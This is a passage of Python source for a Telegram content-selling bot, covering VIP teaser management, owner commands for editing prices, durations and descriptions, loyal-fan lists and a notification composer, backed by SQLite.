command.\")\n        return\n    \n    # Initialize VIP teaser upload session with dedicated key\n    teaser_key = f\"{OWNER_ID}_vip_teaser\"\n    upload_sessions[teaser_key] = {\n        'type': 'vip_teaser',\n        'step': 'waiting_for_file',\n        'data': {}\n    }\n    \n    upload_text = \"\"\"\n🎬 <b>VIP TEASER UPLOAD</b> 🎬\n\n📤 <b>Step 1: Upload File</b>\nSend me the photo or video you want to use as a VIP-exclusive teaser.\n\n💎 <b>VIP Teasers are shown to:</b>\n• VIP members only when they use /teaser command\n• These replace regular teasers for VIP users\n\n📱 <b>Supported Files:</b>\n• Photos (JPG, PNG, etc.)\n• Videos (MP4, MOV, AVI)\n\n🎯 <b>VIP Teaser Tips:</b>\n• Use higher quality content than regular teasers\n• Make it more exclusive/intimate\n• Show VIP members what they're getting for their subscription\n\n📂 Just send the photo/video when ready!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel VIP Teaser Upload\", callback_data=\"vip_teasers_management\"))\n    \n    bot.send_message(chat_id, upload_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_teaser_deletion_interface(chat_id):\n    \"\"\"Show VIP teaser deletion interface\"\"\"\n    vip_teasers = get_vip_teasers_with_id()\n    \n    if not vip_teasers:\n        empty_text = \"\"\"\n🎬 <b>VIP TEASER DELETION</b> 🎬\n\n📭 <b>No VIP teasers found!</b>\n\nYou need to upload VIP teasers first before you can delete them.\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"📤 Upload VIP Teaser\", callback_data=\"vip_teaser_upload\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Teasers\", callback_data=\"vip_teasers_management\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    delete_text = \"\"\"\n🗑️ <b>DELETE VIP TEASER</b> 🗑️\n\n🎯 <b>Your VIP Teasers:</b>\nSelect which VIP teaser you want to delete:\n\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for teaser_id, file_path, file_type, description, created_date in vip_teasers:\n        # Format creation date\n        try:\n            date_obj = datetime.datetime.fromisoformat(created_date)\n            formatted_date = date_obj.strftime(\"%Y-%m-%d\")\n        except:\n            formatted_date = created_date\n        \n        # Truncate description for button\n        short_desc = description[:30] + \"...\" if len(description) > 30 else description\n        button_text = f\"🗑️ {file_type} - {short_desc} ({formatted_date})\"\n        \n        markup.add(types.InlineKeyboardButton(button_text, callback_data=f\"delete_vip_teaser_{teaser_id}\"))\n    \n    markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Teasers\", callback_data=\"vip_teasers_management\"))\n    \n    bot.send_message(chat_id, delete_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_teaser_edit_interface(chat_id):\n    \"\"\"Show VIP teaser edit interface\"\"\"\n    vip_teasers = get_vip_teasers_with_id()\n    \n    if not vip_teasers:\n        empty_text = \"\"\"\n🎬 <b>VIP TEASER EDITING</b> 🎬\n\n📭 <b>No VIP teasers found!</b>\n\nYou need to upload VIP teasers first before you can edit them.\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"📤 Upload VIP Teaser\", callback_data=\"vip_teaser_upload\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Teasers\", callback_data=\"vip_teasers_management\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    edit_text = \"\"\"\n✏️ <b>EDIT VIP TEASER</b> ✏️\n\n🎯 <b>Your VIP Teasers:</b>\nSelect which VIP teaser you want to edit (replace photo/video):\n\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for teaser_id, file_path, file_type, description, created_date in vip_teasers:\n        # Format creation date\n        try:\n            date_obj = datetime.datetime.fromisoformat(created_date)\n            formatted_date = date_obj.strftime(\"%Y-%m-%d\")\n        except:\n            formatted_date = created_date\n        \n        # Truncate description for button\n        short_desc = description[:30] + \"...\" if len(description) > 30 else description\n        button_text = f\"✏️ {file_type} - {short_desc} ({formatted_date})\"\n        \n        markup.add(types.InlineKeyboardButton(button_text, callback_data=f\"edit_vip_teaser_{teaser_id}\"))\n    \n    markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Teasers\", callback_data=\"vip_teasers_management\"))\n    \n    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML')\n\ndef start_vip_teaser_edit_session(chat_id, teaser_id):\n    \"\"\"Start VIP teaser edit session\"\"\"\n    # Get teaser info\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT file_path, file_type, description FROM teasers WHERE id = ? AND vip_only = 1', (teaser_id,))\n    teaser = cursor.fetchone()\n    conn.close()\n    \n    if not teaser:\n        bot.send_message(chat_id, \"❌ VIP teaser not found.\")\n        return\n    \n    file_path, file_type, description = teaser\n    \n    # Initialize edit session\n    upload_sessions[OWNERS[0]] = {\n        'type': 'vip_teaser_edit',\n        'step': 'waiting_for_file',\n        'teaser_id': teaser_id,\n        'old_file_path': file_path,\n        'old_file_type': file_type,\n        'old_description': description\n    }\n    \n    edit_text = f\"\"\"\n✏️ <b>EDIT VIP TEASER</b> ✏️\n\n📝 <b>Current Teaser:</b>\n• Type: {file_type.title()}\n• Description: {description}\n\n📤 <b>Send New File:</b>\nUpload a new photo or video to replace the current teaser content.\n\n💡 <b>Note:</b> This will completely replace the existing file with your new upload.\n\n📱 Just send the new photo/video when ready!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel Edit\", callback_data=\"vip_teasers_management\"))\n    \n    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_teasers_collection(chat_id, user_id):\n    \"\"\"Show VIP teasers collection to VIP members\"\"\"\n    # Check if user is VIP\n    vip_status = check_vip_status(user_id)\n    \n    if not vip_status['is_vip']:\n        # Not VIP, show upgrade message\n        upgrade_text = \"\"\"\n🚫 <b>VIP TEASERS ACCESS RESTRICTED</b> 🚫\n\n💎 This exclusive teaser collection is only available to VIP members!\n\n🌟 <b>What you're missing:</b>\n• Exclusive high-quality teasers\n• Behind-the-scenes content\n• VIP-only previews\n• Premium intimate content\n\n💰 <b>Upgrade to VIP for instant access!</b>\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"💎 Upgrade to VIP\", callback_data=\"vip_access\"))\n        markup.add(types.InlineKeyboardButton(\"🎬 View Free Teasers\", callback_data=\"teasers\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n        bot.send_message(chat_id, upgrade_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    # User is VIP, show VIP teasers collection\n    vip_teasers = get_vip_teasers()\n    \n    if not vip_teasers:\n        empty_text = f\"\"\"\n🎬 <b>VIP TEASERS COLLECTION</b> 🎬\n\n📭 <b>No VIP teasers available yet!</b>\n\nDon't worry, babe! I'm working on creating exclusive VIP content just for my special members like you.\n\n⏰ Your VIP expires in {vip_status['days_left']} days\n\n💝 In the meantime, enjoy your FREE access to all my premium content!\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"🎁 Browse All VIP Content\", callback_data=\"browse_content\"))\n        markup.add(types.InlineKeyboardButton(\"🔄 Extend VIP\", callback_data=\"vip_access\"))\n        markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    # Show VIP teasers collection\n    collection_text = f\"\"\"\n🎬 <b>VIP TEASERS COLLECTION</b> 🎬\n\n💎 Welcome to your exclusive VIP teaser collection! These special previews are made just for my VIP members.\n\n📊 <b>Your VIP Status:</b>\n• VIP Teasers Available: {len(vip_teasers)}\n• VIP Expires: {vip_status['days_left']} days\n\n💕 Enjoy these exclusive glimpses into my world, beautiful! Each teaser is crafted with love just for VIPs like you.\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for i, (file_path, file_type, description) in enumerate(vip_teasers[:5]):  # Show first 5\n        short_desc = description[:30] + \"...\" if len(description) > 30 else description\n        button_text = f\"💎 {file_type.title()} - {short_desc}\"\n        markup.add(types.InlineKeyboardButton(button_text, callback_data=f\"view_vip_teaser_{i}\"))\n    \n    markup.add(types.InlineKeyboardButton(\"🎁 Browse All VIP Content\", callback_data=\"browse_content\"))\n    markup.add(types.InlineKeyboardButton(\"🔄 Extend VIP\", callback_data=\"vip_access\"))\n    markup.add(types.InlineKeyboardButton(\"🏠 Back to Main\", callback_data=\"cmd_start\"))\n    \n    bot.send_message(chat_id, collection_text, reply_markup=markup, parse_mode='HTML')\n\ndef handle_vip_content_deletion(chat_id, content_name):\n    \"\"\"Handle VIP content deletion with confirmation\"\"\"\n    content = get_vip_content_by_name(content_name)\n    \n    if not content:\n        bot.send_message(chat_id, f\"❌ VIP content '{content_name}' not found.\")\n        return\n    \n    name, price, file_path, description, created_date = content\n    \n    confirm_text = f\"\"\"\n⚠️ <b>CONFIRM VIP CONTENT DELETION</b> ⚠️\n\nYou are about to delete:\n<b>{name}</b>\n💰 Price: {price} Stars\n📝 {description}\n\n⚠️ <b>Warning:</b> This action cannot be undone!\n\nAre you sure you want to delete this VIP content?\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(f\"🗑️ Yes, Delete {name}\", callback_data=f\"confirm_vip_delete_{name}\"))\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"vip_manage_content\"))\n    \n    bot.send_message(chat_id, confirm_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_content_edit_interface(chat_id, content_name):\n    \"\"\"Show enhanced VIP content edit interface with inline buttons\"\"\"\n    content = get_vip_content_by_name(content_name)\n    \n    if not content:\n        bot.send_message(chat_id, f\"❌ VIP content '{content_name}' not found.\")\n        return\n    \n    name, price, file_path, description, created_date = content\n    \n    # Generate clickable file path if it's a URL\n    file_display = \"\"\n    if file_path.startswith(('http://', 'https://')):\n        file_display = f\"<a href='{file_path}'>🔗 View Current File</a>\"\n    else:\n        # Show truncated file path for file IDs\n        file_display = f\"📁 {file_path[:50]}{'...' if len(file_path) > 50 else ''}\"\n    \n    edit_text = f\"\"\"\n✏️ <b>EDIT VIP CONTENT</b> ✏️\n\n<b>Current Details:</b>\n• Name: {name}\n• Price: {price} Stars  \n• Description: {description}\n• File: {file_display}\n\n🔧 <b>Quick Edit Commands:</b>\n• <code>/owner_edit_vip_price {name} [new_price]</code>\n• <code>/owner_edit_vip_description {name} [new_description]</code>\n• <code>/owner_edit_vip_file {name} [new_file_path]</code>\n\n💡 <b>Note:</b> Changes take effect immediately for new VIP subscribers.\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    # Add inline editing buttons\n    markup.add(types.InlineKeyboardButton(\"📁 Upload New File\", callback_data=f\"vip_upload_file_{name}\"))\n    \n    # Add file path link if it's a URL\n    if file_path.startswith(('http://', 'https://')):\n        markup.add(types.InlineKeyboardButton(\"🔗 View Current File\", url=file_path))\n    \n    # Add other editing options\n    markup.add(types.InlineKeyboardButton(\"💰 Edit Price\", callback_data=f\"vip_edit_price_{name}\"))\n    markup.add(types.InlineKeyboardButton(\"📝 Edit Description\", callback_data=f\"vip_edit_desc_{name}\"))\n    \n    # Navigation only - deletion is handled from main VIP management\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Content\", callback_data=\"vip_manage_content\"))\n    \n    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML', disable_web_page_preview=False)\n\n@bot.message_handler(commands=['owner_list_vips'])\ndef owner_list_vips(message):\n    \"\"\"Handle /owner_list_vips command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    # Get all active VIP users\n    cursor.execute('''\n        SELECT u.user_id, u.first_name, u.username, v.start_date, v.expiry_date, v.total_payments\n        FROM vip_subscriptions v\n        JOIN users u ON v.user_id = u.user_id\n        WHERE v.is_active = 1\n        ORDER BY v.expiry_date DESC\n    ''')\n    vip_users = cursor.fetchall()\n    \n    conn.close()\n    \n    if vip_users:\n        vip_text = \"💎 <b>ACTIVE VIP MEMBERS</b> 💎\\n\\n\"\n        \n        for user_id, first_name, username, start_date, expiry_date, payments in vip_users:\n            safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            \n            # Calculate days left\n            try:\n                expiry_datetime = datetime.datetime.fromisoformat(expiry_date)\n                days_left = (expiry_datetime - datetime.datetime.now()).days\n                days_text = f\"{days_left} days left\"\n            except:\n                days_text = \"Invalid date\"\n            \n            vip_text += f\"👤 {safe_first_name} (@{safe_username})\\n\"\n            vip_text += f\"   ⏰ {days_text} | 💰 {payments} payments\\n\"\n            vip_text += f\"   🆔 ID: {user_id}\\n\\n\"\n        \n        bot.send_message(message.chat.id, vip_text, parse_mode='HTML')\n    else:\n        bot.send_message(message.chat.id, \"💎 No active VIP members yet.\")\n\n@bot.message_handler(commands=['owner_set_vip_price'])\ndef owner_set_vip_price(message):\n    \"\"\"Handle /owner_set_vip_price command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    try:\n        # Parse command: /owner_set_vip_price [price]\n        parts = message.text.split()\n        if len(parts) != 2:\n            bot.send_message(message.chat.id, \"❌ Usage: <code>/owner_set_vip_price [price_in_stars]</code>\\nExample: <code>/owner_set_vip_price 399</code>\", parse_mode='HTML')\n            return\n        \n        new_price = int(parts[1])\n        \n        if new_price < 1 or new_price > 150000:\n            bot.send_message(message.chat.id, \"❌ Price must be between 1 and 150,000 Stars.\")\n            return\n        \n        # Update VIP price setting\n        update_vip_settings('vip_price_stars', str(new_price))\n        \n        bot.send_message(message.chat.id, f\"✅ VIP subscription price updated to {new_price:,} Stars!\")\n        \n    except ValueError:\n        bot.send_message(message.chat.id, \"❌ Invalid price. Please enter a number.\")\n    except Exception as e:\n        bot.send_message(message.chat.id, f\"❌ Error updating VIP price: {str(e)}\")\n\n@bot.message_handler(commands=['owner_set_vip_duration'])\ndef owner_set_vip_duration(message):\n    \"\"\"Handle /owner_set_vip_duration command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    try:\n        # Parse command: /owner_set_vip_duration [days]\n        parts = message.text.split()\n        if len(parts) != 2:\n            bot.send_message(message.chat.id, \"❌ Usage: <code>/owner_set_vip_duration [days]</code>\\nExample: <code>/owner_set_vip_duration 30</code>\", parse_mode='HTML')\n            return\n        \n        new_duration = int(parts[1])\n        \n        if new_duration < 1 or new_duration > 365:\n            bot.send_message(message.chat.id, \"❌ Duration must be between 1 and 365 days.\")\n            return\n        \n        # Update VIP duration setting\n        update_vip_settings('vip_duration_days', str(new_duration))\n        \n        bot.send_message(message.chat.id, f\"✅ VIP subscription duration updated to {new_duration} days!\")\n        \n    except ValueError:\n        bot.send_message(message.chat.id, \"❌ Invalid duration. Please enter a number.\")\n    except Exception as e:\n        bot.send_message(message.chat.id, f\"❌ Error updating VIP duration: {str(e)}\")\n\n@bot.message_handler(commands=['owner_set_vip_description'])\ndef owner_set_vip_description(message):\n    \"\"\"Handle /owner_set_vip_description command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    try:\n        # Parse command: /owner_set_vip_description [description]\n        parts = message.text.split(' ', 1)\n        if len(parts) != 2:\n            bot.send_message(message.chat.id, \"❌ Usage: <code>/owner_set_vip_description [description]</code>\\nExample: <code>/owner_set_vip_description Premium VIP access with exclusive content</code>\", parse_mode='HTML')\n            return\n        \n        new_description = parts[1].strip()\n        \n        if len(new_description) < 5 or len(new_description) > 200:\n            bot.send_message(message.chat.id, \"❌ Description must be between 5 and 200 characters.\")\n            return\n        \n        # Update VIP description setting\n        update_vip_settings('vip_description', new_description)\n        \n        bot.send_message(message.chat.id, f\"✅ VIP description updated to: {new_description}\")\n        \n    except Exception as e:\n        bot.send_message(message.chat.id, f\"❌ Error updating VIP description: {str(e)}\")\n\n@bot.message_handler(commands=['owner_edit_price'])\ndef owner_edit_price(message):\n    \"\"\"Handle /owner_edit_price command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    try:\n        # Parse command: /owner_edit_price [content_name] [new_price]\n        parts = message.text.split()\n        if len(parts) != 3:\n            bot.send_message(message.chat.id, \"❌ Usage: <code>/owner_edit_price [content_name] [new_price]</code>\\nExample: <code>/owner_edit_price photo_set_1 75</code>\", parse_mode='HTML')\n            return\n        \n        content_name = parts[1]\n        new_price = int(parts[2])\n        \n        if new_price < 0 or new_price > 150000:\n            bot.send_message(message.chat.id, \"❌ Price must be between 0 and 150,000 Stars.\")\n            return\n        \n        # Update content price\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        cursor.execute('UPDATE content_items SET price_stars = ? WHERE name = ?', (new_price, content_name))\n        updated_count = cursor.rowcount\n        conn.commit()\n        conn.close()\n        \n        if updated_count > 0:\n            bot.send_message(message.chat.id, f\"✅ Price for '{content_name}' updated to {new_price:,} Stars!\")\n        else:\n            bot.send_message(message.chat.id, f\"❌ Content '{content_name}' not found.\")\n        \n    except ValueError:\n        bot.send_message(message.chat.id, \"❌ Invalid price. Please enter a number.\")\n    except Exception as e:\n        bot.send_message(message.chat.id, f\"❌ Error updating price: {str(e)}\")\n\n@bot.message_handler(commands=['owner_edit_description'])\ndef owner_edit_description(message):\n    \"\"\"Handle /owner_edit_description command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    try:\n        # Parse command: /owner_edit_description [content_name] [new_description]\n        parts = message.text.split(' ', 2)\n        if len(parts) != 3:\n            bot.send_message(message.chat.id, \"❌ Usage: <code>/owner_edit_description [content_name] [new_description]</code>\\nExample: <code>/owner_edit_description photo_set_1 Amazing exclusive photo collection</code>\", parse_mode='HTML')\n            return\n        \n        content_name = parts[1]\n        new_description = parts[2].strip()\n        \n        if len(new_description) < 5 or len(new_description) > 500:\n            bot.send_message(message.chat.id, \"❌ Description must be between 5 and 500 characters.\")\n            return\n        \n        # Update content description\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        cursor.execute('UPDATE content_items SET description = ? WHERE name = ?', (new_description, content_name))\n        updated_count = cursor.rowcount\n        conn.commit()\n        conn.close()\n        \n        if updated_count > 0:\n            bot.send_message(message.chat.id, f\"✅ Description for '{content_name}' updated successfully!\")\n        else:\n            bot.send_message(message.chat.id, f\"❌ Content '{content_name}' not found.\")\n        \n    except Exception as e:\n        bot.send_message(message.chat.id, f\"❌ Error updating description: {str(e)}\")\n\n@bot.message_handler(commands=['owner_edit_file_path'])\ndef owner_edit_file_path(message):\n    \"\"\"Handle /owner_edit_file_path command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    try:\n        # Parse command: /owner_edit_file_path [content_name] [new_file_path]\n        parts = message.text.split(' ', 2)\n        if len(parts) != 3:\n            bot.send_message(message.chat.id, \"❌ Usage: <code>/owner_edit_file_path [content_name] [new_file_path]</code>\\nExample: <code>/owner_edit_file_path photo_set_1 https://example.com/newphoto.jpg</code>\", parse_mode='HTML')\n            return\n        \n        content_name = parts[1]\n        new_file_path = parts[2].strip()\n        \n        if len(new_file_path) < 5:\n            bot.send_message(message.chat.id, \"❌ File path too short. Please provide a valid file path or URL.\")\n            return\n        \n        # Update content file path\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        cursor.execute('UPDATE content_items SET file_path = ? WHERE name = ?', (new_file_path, content_name))\n        updated_count = cursor.rowcount\n        conn.commit()\n        conn.close()\n        \n        if updated_count > 0:\n            bot.send_message(message.chat.id, f\"✅ File path for '{content_name}' updated successfully!\")\n        else:\n            bot.send_message(message.chat.id, f\"❌ Content '{content_name}' not found.\")\n        \n    except Exception as e:\n        bot.send_message(message.chat.id, f\"❌ Error updating file path: {str(e)}\")\n\n# Loyal Fan Management Functions\n\ndef show_mark_loyal_fan_interface(chat_id):\n    \"\"\"Show interface to mark a user as loyal fan\"\"\"\n    # Get all users (paying customers prioritized)\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n        SELECT u.user_id, u.username, u.first_name, u.total_stars_spent, u.interaction_count\n        FROM users u\n        LEFT JOIN loyal_fans l ON u.user_id = l.user_id\n        WHERE l.user_id IS NULL \n            AND u.user_id != ?\n            AND (u.username IS NULL OR LOWER(u.username) NOT LIKE '%bot')\n        ORDER BY u.total_stars_spent DESC, u.interaction_count DESC\n        LIMIT 20\n    ''', (OWNER_ID,))\n    non_loyal_users = cursor.fetchall()\n    conn.close()\n    \n    if not non_loyal_users:\n        empty_text = \"\"\"\n⭐ <b>MARK LOYAL FAN</b> ⭐\n\n📭 <b>All users are already marked as loyal fans!</b>\n\nOr no users found in database yet.\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to Loyal Fan Management\", callback_data=\"loyal_fan_management_menu\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    mark_text = f\"\"\"\n⭐ <b>MARK LOYAL FAN</b> ⭐\n\n👥 <b>Select a user to mark as loyal fan:</b>\n\nFound {len(non_loyal_users)} user(s) not yet marked as loyal. Top customers shown first:\n\n💡 <b>Tip:</b> Mark your best customers and most engaged fans!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for user_id, username, first_name, stars_spent, interactions in non_loyal_users:\n        # Escape HTML special characters\n        safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        \n        # Create button text with user details\n        button_text = f\"⭐ {safe_first_name} (@{safe_username}) | {stars_spent}⭐ | {interactions} msgs\"\n        \n        markup.add(types.InlineKeyboardButton(button_text, callback_data=f\"select_loyal_{user_id}\"))\n    \n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Loyal Fan Management\", callback_data=\"loyal_fan_management_menu\"))\n    \n    bot.send_message(chat_id, mark_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_loyal_fans_list(chat_id):\n    \"\"\"Show all loyal fans with their details\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n        SELECT u.user_id, u.username, u.first_name, u.total_stars_spent, \n               l.reason, l.date_marked\n        FROM loyal_fans l\n        JOIN users u ON l.user_id = u.user_id\n        ORDER BY l.date_marked DESC\n    ''')\n    loyal_fans = cursor.fetchall()\n    conn.close()\n    \n    if not loyal_fans:\n        empty_text = \"\"\"\n📋 <b>LOYAL FANS LIST</b> 📋\n\n📭 <b>No loyal fans yet!</b>\n\nStart marking your best customers as loyal fans to track your VIP community.\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"⭐ Mark First Loyal Fan\", callback_data=\"mark_loyal_fan\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to Loyal Fan Management\", callback_data=\"loyal_fan_management_menu\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    loyal_text = f\"\"\"\n📋 <b>LOYAL FANS LIST</b> 📋\n\n⭐ <b>Your {len(loyal_fans)} loyal fan(s):</b>\n\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for user_id, username, first_name, stars_spent, reason, date_marked in loyal_fans:\n        # Escape HTML special characters\n        safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        safe_reason = (reason or 'No reason specified').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        \n        # Format date\n        try:\n            date_obj = datetime.datetime.fromisoformat(date_marked)\n            formatted_date = date_obj.strftime(\"%b %d, %Y\")\n        except:\n            formatted_date = \"Unknown\"\n        \n        loyal_text += f\"⭐ <b>{safe_first_name} (@{safe_username})</b>\\n\"\n        loyal_text += f\"   💰 {stars_spent} Stars spent\\n\"\n        loyal_text += f\"   📝 Reason: {safe_reason}\\n\"\n        loyal_text += f\"   📅 Marked: {formatted_date}\\n\\n\"\n        \n        # Add remove button for each loyal fan\n        markup.add(types.InlineKeyboardButton(f\"❌ Remove {first_name}\", callback_data=f\"remove_loyal_{user_id}\"))\n    \n    markup.add(types.InlineKeyboardButton(\"⭐ Mark New Loyal Fan\", callback_data=\"mark_loyal_fan\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Loyal Fan Management\", callback_data=\"loyal_fan_management_menu\"))\n    \n    bot.send_message(chat_id, loyal_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_remove_loyal_fan_interface(chat_id):\n    \"\"\"Show interface to remove loyal fan status\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n        SELECT u.user_id, u.username, u.first_name, l.reason, l.date_marked\n        FROM loyal_fans l\n        JOIN users u ON l.user_id = u.user_id\n        ORDER BY l.date_marked DESC\n    ''')\n    loyal_fans = cursor.fetchall()\n    conn.close()\n    \n    if not loyal_fans:\n        empty_text = \"\"\"\n❌ <b>REMOVE LOYAL STATUS</b> ❌\n\n📭 <b>No loyal fans to remove!</b>\n\nYou haven't marked any users as loyal fans yet.\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"⭐ Mark First Loyal Fan\", callback_data=\"mark_loyal_fan\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to Loyal Fan Management\", callback_data=\"loyal_fan_management_menu\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    remove_text = f\"\"\"\n❌ <b>REMOVE LOYAL STATUS</b> ❌\n\n⚠️ <b>Select a loyal fan to remove their status:</b>\n\nFound {len(loyal_fans)} loyal fan(s). This action cannot be undone!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for user_id, username, first_name, reason, date_marked in loyal_fans:\n        # Escape HTML special characters\n        safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        \n        # Format date\n        try:\n            date_obj = datetime.datetime.fromisoformat(date_marked)\n            formatted_date = date_obj.strftime(\"%b %d\")\n        except:\n            formatted_date = \"Unknown\"\n        \n        # Create button text\n        button_text = f\"❌ {safe_first_name} (@{safe_username}) | {formatted_date}\"\n        \n        markup.add(types.InlineKeyboardButton(button_text, callback_data=f\"confirm_remove_loyal_{user_id}\"))\n    \n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Loyal Fan Management\", callback_data=\"loyal_fan_management_menu\"))\n    \n    bot.send_message(chat_id, remove_text, reply_markup=markup, parse_mode='HTML')\n\n# Notification System Functions\n\ndef show_notification_composer(chat_id, target_group):\n    \"\"\"Show notification composer interface\"\"\"\n    target_names = {\n        'all': 'All Users',\n        'vip': 'VIP Members',\n        'non_vip': 'Non-VIP Users'\n    }\n    \n    target_name = target_names.get(target_group, 'Unknown')\n    \n    # Get target user count\n    if target_group == 'all':\n        users = get_all_users()\n    elif target_group == 'vip':\n        users = get_vip_subscribers()\n    elif target_group == 'non_vip':\n        users = get_non_vip_users()\n    else:\n        users = []\n    \n    user_count = len(users)\n    \n    composer_text = f\"\"\"\n📢 <b>NOTIFICATION COMPOSER</b> 📢\n\n🎯 <b>Target Group:</b> {target_name}\n👥 <b>Recipients:</b> {user_count} users\n\n📝 <b>Instructions:</b>\nSend your message in your next message. It will be delivered to all {target_name.lower()}.\n\n✨ <b>Tips:</b>\n• Use HTML formatting (bold: &lt;b&gt;text&lt;/b&gt;, italic: &lt;i&gt;text&lt;/i&gt;)\n• Keep messages engaging and personal\n• Include relevant emojis for better engagement\n• Messages will be pinned for VIP notifications\n\n💡 <b>Ready to compose your message!</b>\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"notification_management_menu\"))\n    \n    bot.send_message(chat_id, composer_text, reply_markup=markup, parse_mode='HTML')\n    \n    # Store the notification session\n    notification_sessions[chat_id] = {\n        'target_group': target_group,\n        'users': users,\n        'waiting_for_message': True\n    }\n\n# Callback query handlers\n\n@bot.callback_query_handler(func=lambda call: True)\ndef handle_callback_query(call):\n    \"\"\"Handle inline keyboard callbacks\"\"\"\n    \n    # Register user interaction for all callback queries\n    